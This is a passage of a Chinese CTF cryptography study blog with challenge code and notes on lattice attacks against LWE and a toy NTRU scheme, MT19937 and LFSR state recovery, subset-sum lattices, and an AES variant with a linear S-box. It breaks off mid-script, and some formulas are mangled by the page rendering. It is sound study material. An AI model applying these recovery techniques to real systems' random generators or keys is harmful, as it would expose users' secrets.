class="built_in">list</span>(s)).encode()).digest(), AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;A = <span class="subst">&#123;<span class="built_in">list</span>(A)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;m = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>假如说有 $\bold{As\equiv b}\mod p$ ,已知A和b的情况下我们可以直接solve_right()解决.<br>但是现在加上了随机误差,即公式变成 $\bold{As+e\equiv b}\mod p$ ,就不好搞了,这种问题被称作LWE问题.<br>首先根据前面的总结我们可以直接构造下面的格:($I_n$是n阶单位矩阵)$$L_1 = \left(\begin{array}{ccc}\alpha\cdot p\bold I_m &amp;&amp;\\alpha\cdot \bold A^T &amp; \bold I_n &amp;\\alpha\cdot \bold b^T &amp; &amp; \beta\\end{array}\right)$$</p><h1>$L_1$具有如下的短向量$$\left(\begin{array}{ccc|c|c}k_1 &amp; \cdots &amp; k_m &amp; -\bold s^T &amp; 1\end{array}\right)L_1</h1><p>\underbrace{\left(\begin{array}{c|c|c}\alpha\cdot \bold e^T &amp; -\bold s^T &amp; \beta\end{array}\right)}_{\bold t_1}$$</p><p>为了提高格基约化的质量，我们显然需要精心选择$\alpha$与$\beta$，使得$\bold t_1$分量的尺寸相近。<br>刚刚构造的$L_1$是一个$(m+n+1)\times (m+n+1)$维的矩阵。注意到$\bold s$本身并非短向量，我们可以考虑不在右侧用单位矩阵接收$\bold s$。通过初等行变换，我们可以将$\bold A^T$（$m&gt;n$，一般$\operatorname{\text{rank}}({\bold A^T}) = n$）变换为如下的行阶梯形（row echelon form）。$$\bold P\bold A^T \equiv \left(\begin{array}{c|c}\bold I_n &amp; \bold A’^T_{n\times(m-n)}\end{array}\right) \pmod{p}$$于是$$\bold b^T - (\bold s^T\bold P^{-1})(\bold P \bold A^T) \equiv \bold e^T \pmod{p}$$</p><p>接下来考虑$$L_2 = \left(\begin{array}{ccc}\bold I_n &amp; \bold A’^T_{n\times(m-n)} &amp; \&amp; p\bold I_{m-n} &amp; \\bold b(1,\cdots,n) &amp; \bold b(n+1,\cdots,m) &amp; \beta\\end{array}\right)$$</p><h1>$L_2$中有短向量$$\left(\begin{array}{ccc|ccc|c}-x_1 + k_1p &amp; \cdots &amp; -x_n + k_np &amp; k_{n+1} &amp; \cdots &amp; k_m &amp; 1\end{array}\right)L_2</h1><p>\underbrace{\left(\begin{array}{c|c}\bold e^T &amp; \beta\end{array}\right)}_{\bold t_2}$$</p><p>\noindent 其中$\bold s^T\bold P^{-1} \equiv (x_1, \cdots, x_n) \pmod{p}$。</p><p>我们需要$\beta$的尺寸与误差的尺寸相近。$L_2$的维数只有$(m+1)\times (m+1)$，通过$L_2$解决LWE问题的攻击方式称为原始攻击（primal attack）。<br>另外，不难发现当$m\le n$时通过格基约化是不可能求出$\bold e$的(因为LLL需要细长的矩阵)（假设$\bold A$、$\bold s$随机生成）。</p><h3 id="神秘加密体系-NTRU">神秘加密体系(NTRU)</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">pbits, qbits</span>):</span><br><span class="line">    p = getPrime(pbits)</span><br><span class="line">    q = getPrime(qbits)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomNBitInteger(qbits//<span class="number">4</span>) | <span class="number">1</span></span><br><span class="line">        b = getRandomNBitInteger(qbits//<span class="number">4</span>) | <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> GCD(a, b) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    h = a * <span class="built_in">pow</span>(b, -<span class="number">1</span>, q) % q</span><br><span class="line">    pkey = (h, p, q, pbits, qbits)</span><br><span class="line">    skey = (a, b, pkey)</span><br><span class="line">    <span class="keyword">return</span> pkey, skey</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, pkey</span>):</span><br><span class="line">    h, p, q, pbits, qbits = pkey</span><br><span class="line">    r = getRandomNBitInteger(qbits//<span class="number">4</span>-<span class="number">1</span>)</span><br><span class="line">    c = (p*h*r + m) % q</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c, skey</span>):</span><br><span class="line">    a, b, (h, p, q, pbits, qbits) = skey</span><br><span class="line">    mb = c*b % q % (p*a)</span><br><span class="line">    <span class="keyword">if</span> mb % b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> mb // b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError</span><br><span class="line">pkey, skey = keygen(<span class="number">2048</span>, <span class="number">4096</span>)</span><br></pre></td></tr></table></figure><p>把多项式环上的加密算法放到整数环上,可以被构造$$\begin{bmatrix}q&amp;0\\h&amp;1\end{bmatrix}$$这个格,然后使用lll求出最短向量,答案大概率就是ab(噪音消下去了)</p><h3 id="mt19937">mt19937</h3><p>有一个性质是,mt19937的状态只有624种,只需要知道连续的624个输入就能还原整个引擎.<br>内部实现类似&quot;分块&quot;,初始化种子之后进行一轮&quot;twist&quot;会产生624个新的可用随机数,然后输出时候再过一遍仿射变换.<br>这种引擎在密码学上是不安全的,因为输出的仿射变换是可逆的(用了xor运算),且twist操作只和i,i+1,(i+397)%624这三个数有关,也就是说,假设我们知道部分输出,也能逆向出部分引擎的状态.</p><p>还有就是,mt一次会输出32个数字,在py里面如果需要比如说只有8个数字,就会舍掉低位的;<br>如果需要50个数字,会先拼成64位,然后再舍.</p><h3 id="子集和">子集和</h3><p>时间复杂度 $O(n^3\log^2w)$ ,构造下面的格直接跑LLL然后取最上面最小的那个向量即可.$$\begin{bmatrix}1&amp;&amp;&amp;&amp;a_1\&amp;1&amp;&amp;&amp;a_2\&amp;&amp;1&amp;&amp;a_3\…&amp;&amp;…&amp;&amp;…\&amp;&amp;&amp;…&amp;-S\end{bmatrix}$$原因是,自己和可以被视作是一个小的向量乘进原先的a矩阵,所以答案可以通过LLL求出来.</p><blockquote><p>补充:经anon酱指正,子集和问题因为要限定向量最后的数字是1,而且限定前面的值全部是1或-1,所以有下面更强的格:$$\begin{bmatrix}2&amp;&amp;&amp;&amp;a_1\&amp;2&amp;&amp;&amp;a_2\&amp;&amp;2&amp;&amp;…\…&amp;&amp;…&amp;2&amp;a_n\1&amp;1&amp;…&amp;1&amp;S\end{bmatrix}$$也许能解一下,不然就只能带alpha然后各种调参了<br>hint:注意下面的格期望的变量是这个格式:(1,-1,1,-1,…,1,1,-1,-1,…,0)不是末尾-1的.</p></blockquote><h2 id="LFSR-反馈啥啥生成器">LFSR 反馈啥啥生成器</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LFSR</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, vec, mask</span>):</span><br><span class="line">        self.mask = mask</span><br><span class="line">        self.vec  = vec</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        self.vec = self.vec[<span class="number">1</span>:] + [<span class="built_in">sum</span>(self.vec[i]&amp;self.mask[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)) &amp; <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> self.vec[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>生成脚本的大意是说,每次都会计算当前vec和mask与的和是不是奇数,然后丢掉最靠前的数字,把算出来的数字加到末尾.<br>只需要二倍mask和vec大小(他俩必须一样大)就能完整还原整个状态,即:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mat=[] <span class="comment"># 构建的矩阵</span></span><br><span class="line">mbt=[[],[],[]] <span class="comment"># 答案矩阵,注意是很多行而不是一行</span></span><br><span class="line">f=GF(<span class="number">2</span>) <span class="comment"># 因为奇偶要对2取模,所以在模2上进行</span></span><br><span class="line">A=Matrix(f,mat)</span><br><span class="line">B=Matrix(f,mbt)</span><br><span class="line">x=A.solve_right(B)</span><br><span class="line"><span class="built_in">print</span>(x) <span class="comment"># mask矩阵</span></span><br></pre></td></tr></table></figure><p>下面是逆向还原状态的脚本,假如mask[0]==0那么mask还得顺推直到找到第一个mask是1的才行,到时候再改.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">msk,vec,tar</span>):</span><br><span class="line">res=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">511</span>):</span><br><span class="line">res+=vec[i]&amp;msk[i+<span class="number">1</span>]</span><br><span class="line">res=res&amp;<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> res==tar:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">elif</span> msk[<span class="number">0</span>]==<span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">assert</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h2 id="AES">AES</h2><p>以stupid box 1为例.<br>加密:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> zip_longest</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> m: m + <span class="built_in">bytes</span>([<span class="number">16</span> - <span class="built_in">len</span>(m) % <span class="number">16</span>] * (<span class="number">16</span> - <span class="built_in">len</span>(m) % <span class="number">16</span>))</span><br><span class="line">xor = <span class="keyword">lambda</span> a, b: <span class="built_in">bytes</span>(aa ^ bb <span class="keyword">for</span> aa, bb <span class="keyword">in</span> zip_longest(a, b))</span><br><span class="line"></span><br><span class="line">stupid_box = [</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x60</span>, <span class="number">0x70</span>, <span class="number">0x40</span>, <span class="number">0x50</span>, <span class="number">0x20</span>, <span class="number">0x30</span>, <span class="number">0x81</span>, <span class="number">0x91</span>, <span class="number">0xe1</span>, <span class="number">0xf1</span>, <span class="number">0xc1</span>, <span class="number">0xd1</span>, <span class="number">0xa1</span>, <span class="number">0xb1</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x13</span>, <span class="number">0x63</span>, <span class="number">0x73</span>, <span class="number">0x43</span>, <span class="number">0x53</span>, <span class="number">0x23</span>, <span class="number">0x33</span>, <span class="number">0x82</span>, <span class="number">0x92</span>, <span class="number">0xe2</span>, <span class="number">0xf2</span>, <span class="number">0xc2</span>, <span class="number">0xd2</span>, <span class="number">0xa2</span>, <span class="number">0xb2</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x17</span>, <span class="number">0x67</span>, <span class="number">0x77</span>, <span class="number">0x47</span>, <span class="number">0x57</span>, <span class="number">0x27</span>, <span class="number">0x37</span>, <span class="number">0x86</span>, <span class="number">0x96</span>, <span class="number">0xe6</span>, <span class="number">0xf6</span>, <span class="number">0xc6</span>, <span class="number">0xd6</span>, <span class="number">0xa6</span>, <span class="number">0xb6</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0x14</span>, <span class="number">0x64</span>, <span class="number">0x74</span>, <span class="number">0x44</span>, <span class="number">0x54</span>, <span class="number">0x24</span>, <span class="number">0x34</span>, <span class="number">0x85</span>, <span class="number">0x95</span>, <span class="number">0xe5</span>, <span class="number">0xf5</span>, <span class="number">0xc5</span>, <span class="number">0xd5</span>, <span class="number">0xa5</span>, <span class="number">0xb5</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x16</span>, <span class="number">0x66</span>, <span class="number">0x76</span>, <span class="number">0x46</span>, <span class="number">0x56</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x87</span>, <span class="number">0x97</span>, <span class="number">0xe7</span>, <span class="number">0xf7</span>, <span class="number">0xc7</span>, <span class="number">0xd7</span>, <span class="number">0xa7</span>, <span class="number">0xb7</span>,</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x15</span>, <span class="number">0x65</span>, <span class="number">0x75</span>, <span class="number">0x45</span>, <span class="number">0x55</span>, <span class="number">0x25</span>, <span class="number">0x35</span>, <span class="number">0x84</span>, <span class="number">0x94</span>, <span class="number">0xe4</span>, <span class="number">0xf4</span>, <span class="number">0xc4</span>, <span class="number">0xd4</span>, <span class="number">0xa4</span>, <span class="number">0xb4</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x61</span>, <span class="number">0x71</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x21</span>, <span class="number">0x31</span>, <span class="number">0x80</span>, <span class="number">0x90</span>, <span class="number">0xe0</span>, <span class="number">0xf0</span>, <span class="number">0xc0</span>, <span class="number">0xd0</span>, <span class="number">0xa0</span>, <span class="number">0xb0</span>,</span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x12</span>, <span class="number">0x62</span>, <span class="number">0x72</span>, <span class="number">0x42</span>, <span class="number">0x52</span>, <span class="number">0x22</span>, <span class="number">0x32</span>, <span class="number">0x83</span>, <span class="number">0x93</span>, <span class="number">0xe3</span>, <span class="number">0xf3</span>, <span class="number">0xc3</span>, <span class="number">0xd3</span>, <span class="number">0xa3</span>, <span class="number">0xb3</span>,</span><br><span class="line">    <span class="number">0x0c</span>, <span class="number">0x1c</span>, <span class="number">0x6c</span>, <span class="number">0x7c</span>, <span class="number">0x4c</span>, <span class="number">0x5c</span>, <span class="number">0x2c</span>, <span class="number">0x3c</span>, <span class="number">0x8d</span>, <span class="number">0x9d</span>, <span class="number">0xed</span>, <span class="number">0xfd</span>, <span class="number">0xcd</span>, <span class="number">0xdd</span>, <span class="number">0xad</span>, <span class="number">0xbd</span>,</span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x1f</span>, <span class="number">0x6f</span>, <span class="number">0x7f</span>, <span class="number">0x4f</span>, <span class="number">0x5f</span>, <span class="number">0x2f</span>, <span class="number">0x3f</span>, <span class="number">0x8e</span>, <span class="number">0x9e</span>, <span class="number">0xee</span>, <span class="number">0xfe</span>, <span class="number">0xce</span>, <span class="number">0xde</span>, <span class="number">0xae</span>, <span class="number">0xbe</span>,</span><br><span class="line">    <span class="number">0x0b</span>, <span class="number">0x1b</span>, <span class="number">0x6b</span>, <span class="number">0x7b</span>, <span class="number">0x4b</span>, <span class="number">0x5b</span>, <span class="number">0x2b</span>, <span class="number">0x3b</span>, <span class="number">0x8a</span>, <span class="number">0x9a</span>, <span class="number">0xea</span>, <span class="number">0xfa</span>, <span class="number">0xca</span>, <span class="number">0xda</span>, <span class="number">0xaa</span>, <span class="number">0xba</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x18</span>, <span class="number">0x68</span>, <span class="number">0x78</span>, <span class="number">0x48</span>, <span class="number">0x58</span>, <span class="number">0x28</span>, <span class="number">0x38</span>, <span class="number">0x89</span>, <span class="number">0x99</span>, <span class="number">0xe9</span>, <span class="number">0xf9</span>, <span class="number">0xc9</span>, <span class="number">0xd9</span>, <span class="number">0xa9</span>, <span class="number">0xb9</span>,</span><br><span class="line">    <span class="number">0x0a</span>, <span class="number">0x1a</span>, <span class="number">0x6a</span>, <span class="number">0x7a</span>, <span class="number">0x4a</span>, <span class="number">0x5a</span>, <span class="number">0x2a</span>, <span class="number">0x3a</span>, <span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xeb</span>, <span class="number">0xfb</span>, <span class="number">0xcb</span>, <span class="number">0xdb</span>, <span class="number">0xab</span>, <span class="number">0xbb</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x19</span>, <span class="number">0x69</span>, <span class="number">0x79</span>, <span class="number">0x49</span>, <span class="number">0x59</span>, <span class="number">0x29</span>, <span class="number">0x39</span>, <span class="number">0x88</span>, <span class="number">0x98</span>, <span class="number">0xe8</span>, <span class="number">0xf8</span>, <span class="number">0xc8</span>, <span class="number">0xd8</span>, <span class="number">0xa8</span>, <span class="number">0xb8</span>,</span><br><span class="line">    <span class="number">0x0d</span>, <span class="number">0x1d</span>, <span class="number">0x6d</span>, <span class="number">0x7d</span>, <span class="number">0x4d</span>, <span class="number">0x5d</span>, <span class="number">0x2d</span>, <span class="number">0x3d</span>, <span class="number">0x8c</span>, <span class="number">0x9c</span>, <span class="number">0xec</span>, <span class="number">0xfc</span>, <span class="number">0xcc</span>, <span class="number">0xdc</span>, <span class="number">0xac</span>, <span class="number">0xbc</span>,</span><br><span class="line">    <span class="number">0x0e</span>, <span class="number">0x1e</span>, <span class="number">0x6e</span>, <span class="number">0x7e</span>, <span class="number">0x4e</span>, <span class="number">0x5e</span>, <span class="number">0x2e</span>, <span class="number">0x3e</span>, <span class="number">0x8f</span>, <span class="number">0x9f</span>, <span class="number">0xef</span>, <span class="number">0xff</span>, <span class="number">0xcf</span>, <span class="number">0xdf</span>, <span class="number">0xaf</span>, <span class="number">0xbf</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_rows</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">        m[<span class="number">0x0</span>], m[<span class="number">0x5</span>], m[<span class="number">0xa</span>], m[<span class="number">0xf</span>],</span><br><span class="line">        m[<span class="number">0x4</span>], m[<span class="number">0x9</span>], m[<span class="number">0xe</span>], m[<span class="number">0x3</span>],</span><br><span class="line">        m[<span class="number">0x8</span>], m[<span class="number">0xd</span>], m[<span class="number">0x2</span>], m[<span class="number">0x7</span>],</span><br><span class="line">        m[<span class="number">0xc</span>], m[<span class="number">0x1</span>], m[<span class="number">0x6</span>], m[<span class="number">0xb</span>]</span><br><span class="line">    ])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_bytes</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(stupid_box[mm] <span class="keyword">for</span> mm <span class="keyword">in</span> m)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix_columns</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_gf_mul</span>(<span class="params">a, b</span>):</span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">        d = a</span><br><span class="line">        <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">reversed</span>(<span class="built_in">bin</span>(b)[<span class="number">2</span>:])):</span><br><span class="line">            <span class="keyword">if</span> bit:</span><br><span class="line">                c ^= d</span><br><span class="line">            d = d &lt;&lt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> d &amp; <span class="number">0x100</span>:</span><br><span class="line">                d ^= <span class="number">0x11b</span></span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_mix_column</span>(<span class="params">col</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">2</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">3</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">1</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">2</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">3</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">1</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">2</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">3</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">3</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">2</span>)</span><br><span class="line">        ])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">        *_mix_column(m[:<span class="number">4</span>]),</span><br><span class="line">        *_mix_column(m[<span class="number">4</span>:<span class="number">8</span>]),</span><br><span class="line">        *_mix_column(m[<span class="number">8</span>:<span class="number">12</span>]),</span><br><span class="line">        *_mix_column(m[<span class="number">12</span>:<span class="number">16</span>])</span><br><span class="line">    ])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_round_key</span>(<span class="params">m, k</span>):</span><br><span class="line">    <span class="keyword">return</span> xor(m, k)</span><br><span class="line">RCON = [<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1B</span>, <span class="number">0x36</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_schedule</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(k) == <span class="number">16</span></span><br><span class="line">    sub_keys = [k]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        sub_key = <span class="built_in">bytes</span>(</span><br><span class="line">            stupid_box[w1] ^ w2 ^ rr</span><br><span class="line">                <span class="keyword">for</span> w1, w2, rr <span class="keyword">in</span> <span class="built_in">zip</span>(</span><br><span class="line">                    sub_keys[-<span class="number">1</span>][<span class="number">13</span>:] + sub_keys[-<span class="number">1</span>][<span class="number">12</span>:<span class="number">13</span>],</span><br><span class="line">                    sub_keys[-<span class="number">1</span>][:<span class="number">4</span>],</span><br><span class="line">                    (RCON[i], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">                )</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            sub_key += xor(sub_keys[-<span class="number">1</span>][<span class="number">4</span>*j+<span class="number">4</span>:<span class="number">4</span>*j+<span class="number">8</span>], sub_key[<span class="number">4</span>*j:<span class="number">4</span>*j+<span class="number">4</span>])</span><br><span class="line">        sub_keys.append(sub_key)</span><br><span class="line">    <span class="keyword">return</span> sub_keys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, k</span>):</span><br><span class="line">    sub_keys = key_schedule(k)</span><br><span class="line">    m = add_round_key(m, sub_keys[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        m = sub_bytes(m)</span><br><span class="line">        m = shift_rows(m)</span><br><span class="line">        m = mix_columns(m)</span><br><span class="line">        m = add_round_key(m, sub_keys[i+<span class="number">1</span>])</span><br><span class="line">    m = sub_bytes(m)</span><br><span class="line">    m = shift_rows(m)</span><br><span class="line">    m = add_round_key(m, sub_keys[<span class="number">10</span>])</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_ecb</span>(<span class="params">m, k</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(m) % <span class="number">16</span> == <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(k) == <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(encrypt(m[i:i+<span class="number">16</span>], k) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(m), <span class="number">16</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) % <span class="number">16</span> == <span class="number">0</span></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">ct = encrypt_ecb(pad(flag), key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>观察到:上面是一个标准的AES-128-ECB代码实现,唯一不同的是上面的S盒与标准的S盒有很大的不同,这可以成为攻击的起点:<br>经过一系列测试我们发现这个题目中的s盒有这个性质:假设s盒取址变换为f(x),那么有$$f(x,\mathrm{xor}, y)=f(x),\mathrm{xor} ,f(y)$$而且我们发现原始密文最后有一整个分块的已知明文(pad函数立大功),所以整个变换被理解为&quot;线性的&quot;,我们不必通过一堆轮密钥尝试反推k.<br>解密(ds写的,未经过审计):</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 